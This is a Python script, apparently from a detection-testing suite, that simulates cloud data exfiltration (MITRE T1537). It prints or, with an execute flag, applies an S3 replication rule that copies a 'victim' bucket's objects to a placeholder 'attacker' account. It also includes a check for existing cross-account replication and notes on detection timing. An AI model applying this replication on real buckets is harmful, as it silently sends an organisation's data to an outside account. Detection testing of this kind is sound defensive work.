#!/usr/bin/env python3
"""
DISCLAIMER: This script is provided for authorized security testing and
educational purposes only. Use only in AWS accounts you own or have explicit
written permission to test. In execute mode, this script configures S3
cross-account replication which will cause REAL DATA to be copied to the
specified destination account. Unauthorized use is illegal and unethical.

CDET-009 — S3 Replication to External Account Simulator
Tactic: Exfiltration | T1537

Dry-run (default): Prints the replication configuration JSON that WOULD be
applied, without making any changes.

Execute mode (--execute): Calls put_bucket_replication on the specified source
bucket. WARNING: This causes real S3 data to be copied to the destination
account. Only use in isolated test environments.

Usage:
    # Dry-run — show what would be configured
    python simulate.py --source-bucket my-test-bucket --dest-account 999999999999 --dest-bucket attacker-bucket --replication-role-arn arn:aws:iam::123456789012:role/replication-role

    # Execute — actually configure replication
    python simulate.py --source-bucket my-test-bucket --dest-account 999999999999 --dest-bucket attacker-bucket --replication-role-arn arn:aws:iam::123456789012:role/replication-role --execute

    # Check current replication config on a bucket
    python simulate.py --source-bucket my-test-bucket --check-existing
"""

import argparse
import json
import logging
import sys

import boto3
from botocore.exceptions import ClientError, NoCredentialsError

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)-8s %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("cdet009")


def build_replication_config(
    replication_role_arn: str,
    dest_bucket: str,
    dest_account: str,
    prefix_filter: str = "",
    include_delete_markers: bool = True,
) -> dict:
    """Build the replication configuration dictionary."""
    return {
        "Role": replication_role_arn,
        "Rules": [
            {
                "ID": "cdet009-exfil-replication",
                "Status": "Enabled",
                "Filter": {"Prefix": prefix_filter},
                "Destination": {
                    "Bucket": f"arn:aws:s3:::{dest_bucket}",
                    "Account": dest_account,
                    "AccessControlTranslation": {"Owner": "Destination"},
                },
                "DeleteMarkerReplication": {
                    "Status": "Enabled" if include_delete_markers else "Disabled"
                },
            }
        ],
    }


def check_existing_replication(
    s3_client, bucket: str, source_account: str
) -> None:
    """Check if the bucket already has replication configured and report findings."""
    log.info("Checking existing replication configuration on: %s", bucket)
    try:
        resp = s3_client.get_bucket_replication(Bucket=bucket)
        config = resp.get("ReplicationConfiguration", {})
        rules = config.get("Rules", [])

        if not rules:
            log.info("No replication rules configured on %s", bucket)
            return

        log.warning("FOUND %d existing replication rule(s) on %s:", len(rules), bucket)
        for i, rule in enumerate(rules):
            dest = rule.get("Destination", {})
            dest_account_id = dest.get("Account", "same-account")
            dest_bucket_arn = dest.get("Bucket", "unknown")
            status = rule.get("Status", "unknown")

            log.warning(
                "  Rule %d: Status=%s | Dest bucket=%s | Dest account=%s",
                i + 1, status, dest_bucket_arn, dest_account_id,
            )

            if dest_account_id != source_account and dest_account_id != "same-account":
                log.warning(
                    "  [ALERT] Cross-account replication detected! "
                    "Destination account %s is external to source account %s",
                    dest_account_id,
                    source_account,
                )

    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "ReplicationConfigurationNotFoundError":
            log.info("No replication configuration found on %s", bucket)
        else:
            log.warning("Error checking replication: %s", code)


def check_bucket_versioning(s3_client, bucket: str) -> bool:
    """Verify that versioning is enabled (required for replication)."""
    try:
        resp = s3_client.get_bucket_versioning(Bucket=bucket)
        status = resp.get("Status", "Disabled")
        if status == "Enabled":
            log.info("Versioning status on %s: Enabled (required for replication)", bucket)
            return True
        else:
            log.warning(
                "Versioning status on %s: %s — replication requires Enabled",
                bucket, status,
            )
            return False
    except ClientError as e:
        log.warning("Could not check versioning: %s", e.response["Error"]["Code"])
        return False


def dry_run(
    source_bucket: str,
    dest_account: str,
    dest_bucket: str,
    replication_role_arn: str,
) -> None:
    """Print the replication configuration that would be applied."""
    config = build_replication_config(
        replication_role_arn=replication_role_arn,
        dest_bucket=dest_bucket,
        dest_account=dest_account,
    )

    print()
    print("=" * 60)
    print("CDET-009 DRY-RUN — Replication Configuration Preview")
    print("=" * 60)
    print()
    print(f"Source bucket:          {source_bucket}")
    print(f"Destination bucket:     {dest_bucket}")
    print(f"Destination account:    {dest_account}")
    print(f"Replication role ARN:   {replication_role_arn}")
    print()
    print("AWS CLI equivalent command:")
    print()
    print(f"  aws s3api put-bucket-replication \\")
    print(f"    --bucket {source_bucket} \\")
    print(f"    --replication-configuration '<CONFIG_JSON>'")
    print()
    print("Replication configuration JSON that WOULD be applied:")
    print()
    print(json.dumps(config, indent=2))
    print()
    print("CloudTrail event that WOULD be generated:")
    print()
    detection_event = {
        "eventName": "PutBucketReplication",
        "eventSource": "s3.amazonaws.com",
        "readOnly": False,
        "requestParameters": {
            "bucketName": source_bucket,
            "ReplicationConfiguration": config,
        },
    }
    print(json.dumps(detection_event, indent=2))
    print()
    print("[DRY-RUN] No changes made. Add --execute flag to actually configure replication.")


def execute_replication(
    session: boto3.Session,
    source_bucket: str,
    dest_account: str,
    dest_bucket: str,
    replication_role_arn: str,
    source_account: str,
) -> None:
    """Execute the PutBucketReplication API call."""
    s3 = session.client("s3")

    # Pre-flight checks
    versioning_ok = check_bucket_versioning(s3, source_bucket)
    if not versioning_ok:
        log.warning(
            "Versioning is not enabled. Replication may fail. "
            "Enable versioning with: aws s3api put-bucket-versioning "
            "--bucket %s --versioning-configuration Status=Enabled",
            source_bucket,
        )

    check_existing_replication(s3, source_bucket, source_account)

    config = build_replication_config(
        replication_role_arn=replication_role_arn,
        dest_bucket=dest_bucket,
        dest_account=dest_account,
    )

    print()
    print("=" * 60)
    print("WARNING: EXECUTING PUT BUCKET REPLICATION")
    print("=" * 60)
    print()
    print("This will configure cross-account S3 replication:")
    print(f"  Source:      s3://{source_bucket} (account {source_account})")
    print(f"  Destination: s3://{dest_bucket} (account {dest_account})")
    print()
    print("All future objects written to the source bucket will be")
    print("AUTOMATICALLY COPIED to the destination account.")
    print()
    print("Proceeding with PutBucketReplication...")
    print()

    try:
        s3.put_bucket_replication(
            Bucket=source_bucket,
            ReplicationConfiguration=config,
        )
        log.info(
            "SUCCESS: PutBucketReplication configured on %s -> %s (account %s)",
            source_bucket, dest_bucket, dest_account,
        )
        log.info(
            "CloudTrail event generated: PutBucketReplication on %s", source_bucket
        )
        log.info(
            "CDET-009 detection should fire within 5-15 minutes "
            "(dependent on CloudTrail delivery delay)"
        )
        print()
        print("Replication is now active. To remove it:")
        print(f"  aws s3api delete-bucket-replication --bucket {source_bucket}")

    except ClientError as e:
        code = e.response["Error"]["Code"]
        log.error("PutBucketReplication failed: %s — %s", code, e.response["Error"]["Message"])
        if code == "InvalidRequest":
            log.error(
                "Ensure: (1) source bucket has versioning enabled, "
                "(2) destination bucket policy allows replication from the role ARN, "
                "(3) destination bucket has versioning enabled"
            )
        sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CDET-009: S3 Replication to External Account Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--source-bucket",
        required=True,
        help="Source S3 bucket name (in the victim account)",
    )
    parser.add_argument(
        "--dest-account",
        default="999999999999",
        help="Destination AWS account ID (attacker account). Default: 999999999999",
    )
    parser.add_argument(
        "--dest-bucket",
        default="simulated-attacker-exfil-bucket",
        help="Destination S3 bucket name (in attacker account)",
    )
    parser.add_argument(
        "--replication-role-arn",
        default="",
        help="ARN of the IAM role that S3 will assume to perform replication",
    )
    parser.add_argument(
        "--check-existing",
        action="store_true",
        help="Check and report existing replication configuration (read-only)",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Actually configure S3 replication. WARNING: causes real data exfiltration to dest account.",
    )
    parser.add_argument(
        "--profile",
        default=None,
        help="AWS profile name. Default: boto3 default chain.",
    )
    parser.add_argument(
        "--region",
        default="us-east-1",
        help="AWS region. Default: us-east-1",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("CDET-009 — S3 Replication to External Account")
    print("Tactic: Exfiltration | MITRE T1537")
    if args.execute:
        print("Mode: EXECUTE (will make real changes)")
    else:
        print("Mode: DRY-RUN (no changes will be made)")
    print("=" * 60)

    try:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
    except Exception as e:
        log.error("Failed to create boto3 session: %s", e)
        sys.exit(1)

    try:
        sts = session.client("sts")
        identity = sts.get_caller_identity()
        source_account = identity["Account"]
        log.info("Authenticated as: %s (Account: %s)", identity["Arn"], source_account)
    except NoCredentialsError:
        log.error("No AWS credentials found. Run 'aws configure' first.")
        sys.exit(1)

    if args.check_existing:
        s3 = session.client("s3")
        check_existing_replication(s3, args.source_bucket, source_account)
        return

    if args.execute:
        if not args.replication_role_arn:
            log.error(
                "--replication-role-arn is required in execute mode. "
                "Provide the ARN of an IAM role with s3:ReplicateObject permissions."
            )
            sys.exit(1)

        if args.dest_account == source_account:
            log.warning(
                "Destination account equals source account. "
                "This simulates same-account replication (less suspicious). "
                "For cross-account simulation, use a different account ID."
            )

        execute_replication(
            session=session,
            source_bucket=args.source_bucket,
            dest_account=args.dest_account,
            dest_bucket=args.dest_bucket,
            replication_role_arn=args.replication_role_arn,
            source_account=source_account,
        )
    else:
        role_arn = args.replication_role_arn or (
            f"arn:aws:iam::{source_account}:role/cdet009-replication-role"
        )
        dry_run(
            source_bucket=args.source_bucket,
            dest_account=args.dest_account,
            dest_bucket=args.dest_bucket,
            replication_role_arn=role_arn,
        )


if __name__ == "__main__":
    main()
